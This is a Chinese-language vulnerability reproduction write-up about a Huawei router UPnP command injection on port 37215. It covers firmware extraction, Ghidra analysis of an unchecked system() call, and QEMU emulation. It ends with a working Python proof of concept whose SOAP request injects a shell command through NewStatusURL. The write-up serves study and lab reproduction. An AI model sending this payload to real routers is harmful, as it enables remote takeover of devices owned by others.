
再废话俩句，个人感觉做路由器相关的漏洞复现，无非就是以下几步：`固件获取`，`提取固件`，`固件漏洞分析`，`环境搭建`，`漏洞利用`，`总结`。以这个步骤来讲解此次文章。

# 01漏洞详情

漏洞和在该嵌入式系统`/bin/mic`下的`37215`端口有关系，该文件通过`37215`端口启动`upnp`协议(通用即插即用)，之后调用了`system()`函数。因此可以向**目标路由器通过此端口发送POST数据**借此**调用到system()函数**，导致攻击者可以通过此数据包远程命令注入且执行，进而控制路由器。

`cat` 查看一下`mic`：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_7NFPYX33Z7XEKMY.png)

# 02固件获取

在这里感谢头顶flag师傅的文章和固件，方便寻找了属于是。

头顶flag师傅固件地址：`dd5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8W2k6g2)9J5k6h3y4G2L8g2)9J5c8Y4l9I4M7r3W2&6j5h3&6Y4i4K6u0r3j5X3q4U0K9%4N6S2M7X3c8Q4x3X3c8S2L8X3q4D9P5i4y4A6M7#2)9J5c8Y4c8J5k6h3g2Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1j5`.

当然，一般路由器官网上都会有固件包或者去网上寻找都可以的。

不一样的是，我在**环境搭建**上，没去利用`qemu`，而是使用了像`attify`虚拟机的`FAT`工具去运行仿真路由器环境。

但是使用`attify`的`fat`运行完虚拟环境以后，没法运行`upnp`和`mis`这俩程序服务，也就是说开启不了`37215`端口，不过这种搭建路由器的方式可以借鉴。

最终还是使用的**`qemu`的系统模式**去模拟路由器环境。

# 03提取固件

使用`Binwalk`提取固件嵌入式系统。不管你用`win`，还是`ubuntu`或者`Kali`，无非只是为了使用**其内的`binwalk`工具**而已，能解出系统才是我们的最终目的。所以不要忘记了初心，用啥系统只要有`binwalk`。

**1、`Kali`下使用`binwalk`**，我的上篇文章已经解释了其内`binwalk`解包为空的方法。

**2、`Ubuntu`下使用`binwalk`**，搜索安装完整版`binwalk`即可。

**3、`Attify`提取固件**，`Attify`是一款物联网渗透测试专用虚拟机，和`Kali`类似，有没有后门啥的我不知道，反正我觉得好用哈哈哈。有知情人士可以交流一波。

本次实验工具使用的是**`Attify`**，比较好用里面`binwalk`和`fat`工具都很全。

`binwalk -Me` 提取固件

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_5U8UU9J2F3E45UR.png)

得到嵌入式系统：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_P5F5Y62Z53BPWRH.png)

# 04固件漏洞分析

由漏洞`POC`可以得知，**远程注入点**在**`<NewStatusURL>`**内，`IDA pro`或`Ghidra`打开`squashfs-root/bin/upnp`,查找`NewStatusURL`。

由于`IDA pro`反汇编出来不是很清晰，有些符号表和函数是没有的，所以这里使用`Ghidra`来看伪代码更加清晰。

`IDA`查找字符串：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_NY6AGQ3QHCK2ZK6.png)

`Ghidra`查找字符串：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_6V7ST9SSXDAPUDP.png)

在`Ghidar`右键查找`<NewStatusURL>`处被哪里调用了。

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_PBMS7VEZ694PQTH.png)

得到关键反汇编代码：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_Y2NG7K3YWXVF3DU.png)

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20 | `int` `FUN_0040749c(` `int` `param_1)`    `{`  `int` `iVar1;`  `int` `local_418;`  `int` `local_414;`  `char acStack1040 [` `1028` `]`  `iVar1` `=` `ATP_XML_GetChildNodeByName(` `*` `(undefined4` `*` `)(param_1` `+` `0x2c` `),` `"NewDownloadURL"`,`0` `,&local_418);`  `if` `(((iVar1` `=` `=` `0` `) && (local_418 !` `=` `0` `)) &&`  `(iVar1` `=` `ATP_XML_GetChildNodeByName`  `(` `*` `(undefined4` `*` `)(param_1` `+` `0x2c` `),` `"NewStatusURL"`,`0` `,&local_414), iVar1` `=` `=` `0` `))`  `{`  `if` `(local_414 !` `=` `0` `) {`  `snprintf(acStack1040,` `0x400` `,` `"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b"` `,`  `local_418,local_414);`  `system(acStack1040);`  `}`  `}`  `return` `iVar1;`  `}` |

**由伪代码可知**：

`&local_418`和`&local_414`都是由`ATP_XML_GetChildNodeByName()`函数从`xml`获取节点。

并且未经任何检查就交由`snprintf()`函数与**`'upg -g -U %s -t '1 Firmware Upgrade Image' -c upnp -r %s -d'`**拼接复制到 `'acStack1040'`。

**最终交由`system()`函数**进行执行。

由上可知，我们的注入点就应该在**`snprintf()`函数**当中，在拼接前的单引号就把它给闭合了。再写入**`system()`函数**支持的命令进行注入，这东西就像那个`sql`注入`20`关似的。

还有看了许多文章，说的应该是两处注入点，一个`NewDownloadURL`，一个`NewStatusURL`，我想了一下，这个无法就是拼接完了(；`ls`；`pwd`；)再拼接一个命令让`system`执行而已。

我的汇编语言并不好，写文章做复现也只是为了学习，也借鉴了很多师傅的文章，这就不一一列举了，如如有不对请指出哈。谢谢各位。

# 05环境搭建

这里我没使用**`qemu`的`system`模式**去搭建路由器环境，因为会出现蛮多`bug`的，所以我先放弃了这种方法，使用的**`FAT`工具**搭建虚拟环境。不过有一说一哈**`qemu`的`User`模式**还是很好用的，你做远程调试什么的还是很有用处的！

进入`Attify`虚拟机的`/home/oit/tools/firmadyne`，使用`FAT`工具去搭建路由器虚拟环境。

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_7W8FYVN8Q4ESUPB.png)

一张图，写明白这个`FAT`工具是咋运行的，到时候就这么搞就行。这个不比`qemu`的系统模式去搭建方便的多哈哈哈哈。不过`Attify`可能有后门再来就是`FAT`工具现在好像是不更新了。我用`3.0`的`FAT`还不如初版的好用。

三次数据库密码打完以后结果图。

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_FGKXUYKQR478KJR.png)

打开浏览器输入`IP`进行测试。

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_SNVESWBUDVCKFDR.png)

`web`端登录账号密码：`admin`，`@Hua1234`。

如上图所示，我们的路由器环境搭建完成。但是运行完以后我愣住了，我本来的想法是运行好了以后直接使用`poc`去注入命令开启目标路由器的`telnetd`服务，但是谁能想到此漏洞那个`upnp`服务没起来，`nmap`扫描不到这个`37215`端口，我也登录不上嵌入式系统，没法继续利用`poc`。

## 使用FAT工具搭建环境当个列子吧。

## 最后还是使用的qemu搭建：

下载`qemu`：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_CZ2WW4YWBUZ38HG.png)

安装依赖文件：

|  |  |
| --- | --- |
| 1 | `apt-get install libglib2.0 libglib2.0-dev autoconf automake libtool uml-utilities bridge-utils` |

下载模拟系统镜像和大端机：

`bd9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3k6h3!0H3L8r3g2Q4x3X3g2V1k6h3u0A6j5h3&6Q4x3X3g2G2M7X3N6Q4x3V1k6Q4y4@1g2S2N6i4u0W2L8o6x3J5i4K6u0r3M7h3g2E0N6g2)9J5c8X3#2A6M7s2y4Q4x3V1j5`.

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_TQ98WJTPKQG25ZV.png)

创建网桥，添加IP：

|  |  |
| --- | --- |
| 1  2 | `brctl addbr Virbr0`  `ifconfig Virbr0` `192.168.147.100/24` `up` |

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_78KA3TS232QDUMX.png)

创建`tap`接口，添加到`Virbr0`内：

|  |  |
| --- | --- |
| 1  2  3 | `tunctl -t tap0`  `ifconfig tap0` `192.168.147.101/24` `up`  `brctl addif Virbr0 tap0` |

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_BJ4QDCA33PVUB68.png)

在系统内再开启一个`bedain`系统：

```
qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -netdev tap,id=tapnet,ifname=tap0,script=no -device rtl8139,netdev=tapnet -nographic
```

启动完成后，输入`root root`进入`debain`系统，添加`IP`尝试`ping`外界：

```
ifconfig eth0 192.168.147.102/24 up
```

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_3N5YC9S4RGMXPTW.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_92GCZC4YJRA2NU6.png)

将提取出来的嵌入式系统`squashfs-root`传到虚拟机内：

```
scp -r squashfs-root root@192.168.147.102:/
```

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_SVBGH4R2VS6AKVR.png)

虚拟机内挂载`dev`和`proc`：

```
mount -o bind /dev /squashfs-root/dev
mount -t proc /proc /squashfs-root/proc
```

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_W5F6GMB5QAY7NNW.png)

在根目录下启动`shell`：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_S9DY7RSF68KNJCU.png)

再开一个终端使用`ssh`连接该虚拟机，用来开启`upnp`和`mic`：

```
ssh root@192.168.147.102
chroot squashfs-root /bin/sh
./bin/upnp
./bin/mic
```

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_ZEPXN3F4YYRKW5T.png)

这时候`ssh`连接的终端已经不能使用了因为`IP`发生了变化，需要用刚开始`qemu`连接的终端更改一下路由器`IP`，方便测试：

```
ifconfig eth0 192.168.147.102/24 up
ifconfig br0 192.168.147.104/24 up
```

使用浏览器进行测试：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_ZNW5P25QTWB8FTU.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_G2F5J7PG56M6NEQ.png)

# 06漏洞利用

我们要利用攻击脚本远程使路由器远程调用`system()`，远程执行命令即可。

`poc`：

```
import requests
headers = {
  "Authorization": "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
}

data = '''<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
<NewStatusURL>;执行的命令;</NewStatusURL>
<NewDownloadURL>HUAWEIUPNP</NewDownloadURL>
</u:Upgrade>
</s:Body>
</s:Envelope>
'''
requests.post('目标路由器IP:37215/ctrlt/DeviceUpgrade_1',headers=headers,data=data)
```

使用`poc`在文件系统根目录下创建`hack`文件夹：

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_AR5SBREK6J8KQ4N.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202203/944590_E3YSXGU5BEP53MU.png)

# 07小结
